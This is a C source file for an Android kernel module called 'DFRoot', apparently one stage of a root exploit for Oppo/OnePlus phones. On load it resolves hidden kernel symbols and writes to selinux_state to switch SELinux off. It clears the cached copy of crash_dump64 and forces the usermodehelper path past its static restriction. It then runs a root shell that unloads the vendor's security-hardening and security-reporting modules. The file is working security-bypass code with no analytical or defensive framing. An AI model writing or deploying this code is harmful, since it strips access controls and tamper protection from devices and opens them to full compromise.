#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/ptrace.h>

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("DFRoot LKM");

extern unsigned long kallsyms_lookup_name(const char *name);
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
typedef void *(*umh_setup_t)(const char *path, char **argv, char **envp, gfp_t gfp,
                             void *init, void *cleanup, void *data);
typedef int (*umh_exec_t)(void *info, int wait);
typedef int  (*kern_path_t)(const char *, unsigned int, struct path *);
typedef int  (*invalidate_t)(struct address_space *);
typedef void (*path_put_t)(const struct path *);

static int __nocfi __init dfroot_init(void)
{
    kallsyms_lookup_name_t get_addr;
    kern_path_t  kern_path_fn;
    invalidate_t invalidate_fn;
    path_put_t   path_put_fn;
    struct path  p;
    umh_setup_t umh_setup;
    umh_exec_t  umh_exec;
    bool *selinux_state;
    void *info;
    int ret;

    // UMH command to run
    static const char sh[] = "/system/bin/sh";
    static char *envp[] = { "PATH=/system/bin", NULL };
    static char *argv[] = { (char *)sh, "-c",
        "touch /dev/dfm0;"
        " rmmod oplus_secure_harden 2>/dev/null;"         //
        " rmmod oplus_security_keventupload 2>/dev/null;" // Oppo/OnePlus
        " rmmod oplus_security_guard 2>/dev/null",        //
        NULL };

    // Symbol finder — kallsyms_lookup_name is directly exported in 4.19
    get_addr = (kallsyms_lookup_name_t)kallsyms_lookup_name;
    if (!get_addr) {
        pr_err("dfroot: kallsyms_lookup_name not available\n");
        return -EINVAL;
    }

    // Invalidate page_cache for crash_dump64
    // NOTE: this can cause issues if a process is currently executing
    //   crash_dump64. We may want to revert to manual restore patching
    kern_path_fn  = (kern_path_t) get_addr("kern_path");
    invalidate_fn = (invalidate_t)get_addr("invalidate_inode_pages2");
    path_put_fn   = (path_put_t)  get_addr("path_put");
    if (!kern_path_fn || !invalidate_fn || !path_put_fn) {
        pr_err("dfroot: cache drop symbols missing\n");
    } else if (kern_path_fn("/apex/com.android.runtime/bin/crash_dump64",
                            LOOKUP_FOLLOW, &p)
            && kern_path_fn("/system/bin/crash_dump64",
                            LOOKUP_FOLLOW, &p)) {
        pr_err("dfroot: kern_path failed for crash_dump64\n");
    } else {
        invalidate_fn(p.dentry->d_inode->i_mapping);
        path_put_fn(&p);
        pr_info("dfroot: cleared page cache for crash_dump64\n");
    }

    // Disable SELinux
    selinux_state = (bool *)get_addr("selinux_state");
    if (!selinux_state) {
        pr_err("dfroot: selinux_state not found\n");
        return -EINVAL;
    }
    WRITE_ONCE(*selinux_state, false);
    pr_info("dfroot: selinux_state permissive\n");

    // Run UMH command
    umh_setup = (umh_setup_t)get_addr("call_usermodehelper_setup");
    umh_exec  = (umh_exec_t)get_addr("call_usermodehelper_exec");
    if (!umh_setup || !umh_exec) {
        pr_err("dfroot: usermodehelper symbols missing (setup=%px exec=%px)\n",
               umh_setup, umh_exec);
        return 0;
    }

    info = umh_setup(sh, argv, envp, GFP_KERNEL, NULL, NULL, NULL);
    if (!info) {
        pr_err("dfroot: usermodehelper_setup: returned NULL\n");
        return 0;
    }
    // bypass CONFIG_STATIC_USERMODEHELPER_PATH="" overriding path to ""
    ((struct subprocess_info *)info)->path = sh;

    ret = umh_exec(info, UMH_WAIT_PROC);
    pr_info("dfroot: usermodehelper_exec returned %d\n", ret);
    
    return 0;
}

static void __exit dfroot_exit(void)
{
}

module_init(dfroot_init);
module_exit(dfroot_exit);
